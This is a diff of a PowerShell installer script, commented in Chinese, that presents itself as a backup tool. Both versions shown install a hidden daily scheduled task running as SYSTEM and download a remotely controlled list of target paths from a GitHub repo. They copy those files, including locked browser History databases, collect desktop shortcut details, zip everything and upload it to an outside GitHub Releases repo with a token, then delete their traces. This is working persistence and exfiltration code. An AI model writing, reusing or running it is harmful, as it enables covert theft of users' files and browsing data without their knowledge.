@@ -15,37 +15,36 @@ function Log($msg) {
 
 Log "`n==== Script Started ===="
 
-# === 保存自身副本 ===
+# === 保存副本到可执行位置 ===
 try {
     $self = $MyInvocation.MyCommand.Definition
     Copy-Item -Path $self -Destination $localPath -Force -ErrorAction Stop
-    Log "✅ 已保存脚本副本到 $localPath"
+    Log "✅ 已保存副本到 $localPath"
 } catch {
-    Log "❌ 保存自身失败：$($_.Exception.Message)"
-    exit 1
+    Log "❌ 无法保存副本：$($_.Exception.Message)"
+    Pause; Start-Process notepad.exe $logPath; exit 1
 }
 
-# === 注册计划任务 ===
+# === 注册任务计划 ===
 try {
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPath`""
     $trigger = New-ScheduledTaskTrigger -Daily -At "00:00"
     $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-
     Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
-    Log "✅ 注册计划任务 [$taskName] 成功（每天 0 点执行）"
+    Log "✅ 注册任务 [$taskName] 成功（每天 0 点执行）"
 } catch {
     Log "❌ 注册任务失败：$($_.Exception.Message)"
-    exit 2
+    Pause; Start-Process notepad.exe $logPath; exit 2
 }
 
-# === 上传逻辑开始 ===
-
+# === 检查 GitHub Token ===
 $token = $env:GITHUB_TOKEN
 if (-not $token) {
     Log "❌ 环境变量 GITHUB_TOKEN 未设置"
-    exit 3
+    Pause; Start-Process notepad.exe $logPath; exit 3
 }
 
+# === 设置上传参数 ===
 $repo = "rtyuiuiop/1"
 $now = Get-Date
 $timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
@@ -56,20 +55,21 @@ $releaseName = "Backup - $computerName - $date"
 $tempRoot = "$env:TEMP\\package-$computerName-$timestamp"
 $zipName = "package-$computerName-$timestamp.zip"
 $zipPath = Join-Path $env:TEMP $zipName
-New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null
+New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null
 
-# === STEP 1: 下载路径列表并复制文件 ===
+# === 下载文件列表 ===
 $remoteTxtUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/upload-target.txt"
 try {
-    Log "📥 正在下载路径列表..."
+    Log "📥 下载上传目录..."
     $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
-    $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
-    Log "✅ 路径列表加载成功，共 $($pathList.Count) 条"
+    $pathList = $remoteList -split "`n" | Where-Object { $_.Trim() -ne "" }
+    Log "✅ 加载路径列表，共 $($pathList.Count) 条"
 } catch {
     Log "❌ 下载路径列表失败：$($_.Exception.Message)"
-    exit 4
+    Pause; Start-Process notepad.exe $logPath; exit 4
 }
 
+# === 复制文件到临时目录 ===
 $index = 0
 foreach ($path in $pathList) {
     $index++
@@ -78,106 +78,89 @@ foreach ($path in $pathList) {
         Log "⚠️ 跳过不存在路径：$path"
         continue
     }
-
     $dest = Join-Path $tempRoot $name
     try {
         if ($path -like "*\\History" -and (Test-Path $path -PathType Leaf)) {
-            $srcDir = Split-Path $path
-            robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
-            Log "📂 使用 robocopy 复制占用文件：$path"
-        } elseif (Test-Path $path -PathType Container) {
-            Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
+            robocopy (Split-Path $path) $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
+            Log "📂 robocopy 成功：$path"
+        } elseif ((Get-Item $path).PSIsContainer) {
+            Copy-Item $path -Destination $dest -Recurse -Force
             Log "📁 文件夹已复制：$path"
         } else {
-            Copy-Item $path -Destination $dest -Force -ErrorAction Stop
+            Copy-Item $path -Destination $dest -Force
             Log "📄 文件已复制：$path"
         }
     } catch {
         Log "❌ 复制失败：$path - $($_.Exception.Message)"
-        exit 5
     }
 }
 
-# === STEP 2: 收集桌面快捷方式信息 ===
+# === 提取桌面快捷信息 ===
 try {
     $desktop = [Environment]::GetFolderPath("Desktop")
-    $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
-    $lnkReport = ""
-
+    $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk -ErrorAction SilentlyContinue
+    $report = ""
     foreach ($lnk in $lnkFiles) {
         $shell = New-Object -ComObject WScript.Shell
-        $shortcut = $shell.CreateShortcut($lnk.FullName)
-        $lnkReport += "[$($lnk.Name)]`n"
-        $lnkReport += "TargetPath: $($shortcut.TargetPath)`n"
-        $lnkReport += "Arguments:  $($shortcut.Arguments)`n"
-        $lnkReport += "StartIn:    $($shortcut.WorkingDirectory)`n"
-        $lnkReport += "Icon:       $($shortcut.IconLocation)`n"
-        $lnkReport += "-----------`n"
+        $sc = $shell.CreateShortcut($lnk.FullName)
+        $report += "[$($lnk.Name)]`nTarget: $($sc.TargetPath)`nArgs: $($sc.Arguments)`nStartIn: $($sc.WorkingDirectory)`nIcon: $($sc.IconLocation)`n-----`n"
     }
-
-    $lnkOutputFile = Join-Path $tempRoot "lnk_info.txt"
-    $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
-    Log "🧷 快捷方式信息已收集"
+    $report | Out-File (Join-Path $tempRoot "lnk_info.txt") -Encoding UTF8
+    Log "🧷 快捷方式已收集"
 } catch {
     Log "⚠️ 快捷方式收集失败：$($_.Exception.Message)"
 }
 
-# === STEP 3: 压缩打包 ===
+# === 生成 ZIP ===
 try {
-    Compress-Archive -Path "$tempRoot\\*" -DestinationPath $zipPath -Force -ErrorAction Stop
-    Log "📦 压缩成功：$zipPath"
+    Compress-Archive -Path "$tempRoot\\*" -DestinationPath $zipPath -Force
+    Log "📦 压缩完成：$zipPath"
 } catch {
     Log "❌ 压缩失败：$($_.Exception.Message)"
-    exit 6
+    Pause; Start-Process notepad.exe $logPath; exit 5
 }
 
-# === STEP 4: 上传 ZIP 到 GitHub Releases ===
+# === 上传至 GitHub Release ===
 $releaseData = @{
-    tag_name = $tag
-    name = $releaseName
-    body = "Automated file package from $computerName on $date"
-    draft = $false
+    tag_name   = $tag
+    name       = $releaseName
+    body       = "Backup from $computerName on $date"
+    draft      = $false
     prerelease = $false
 } | ConvertTo-Json -Depth 3
 
 $headers = @{
     Authorization = "token $token"
-    "User-Agent" = "PowerShellScript"
-    Accept = "application/vnd.github.v3+json"
+    "User-Agent"  = "PSUploader"
+    Accept         = "application/vnd.github.v3+json"
 }
 
 try {
-    $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
-    $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
-    Log "🚀 GitHub Release 创建成功"
+    $res = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData
+    $uploadUrl = $res.upload_url -replace "{.*}", "?name=$zipName"
+    Log "🚀 Release 创建成功"
 } catch {
     Log "❌ 创建 Release 失败：$($_.Exception.Message)"
-    exit 7
+    Pause; Start-Process notepad.exe $logPath; exit 6
 }
 
 try {
-    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
-    $uploadHeaders = @{
-        Authorization = "token $token"
-        "Content-Type" = "application/zip"
-        "User-Agent" = "PowerShellScript"
-    }
-    $response = Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
+    $bytes = [System.IO.File]::ReadAllBytes($zipPath)
+    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers @{ Authorization="token $token"; "Content-Type"="application/zip" } -Body $bytes
     Log "☁️ 文件上传成功：$zipName"
 } catch {
-    Log "❌ 上传文件失败：$($_.Exception.Message)"
-    exit 8
+    Log "❌ 上传 ZIP 失败：$($_.Exception.Message)"
+    Pause; Start-Process notepad.exe $logPath; exit 7
 }
 
-# === STEP 5: 清理临时文件 ===
+# === 清理临时文件 ===
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
 Log "🧹 清理完成"
-Log "==== Script Finished ====`n"
+Log "==== Script Finished ===="
 
-# === 如果是 install.ps1 本体运行（非系统路径），显示日志并暂停 ===
+# === 首次运行时暂停并打开日志 ===
 if ($MyInvocation.MyCommand.Path -notlike "$localPath") {
-    Log "📄 安装脚本执行完成。按任意键查看日志..."
     Pause
-    Start-Process "notepad.exe" $logPath
+    Start-Process notepad.exe $logPath
 }
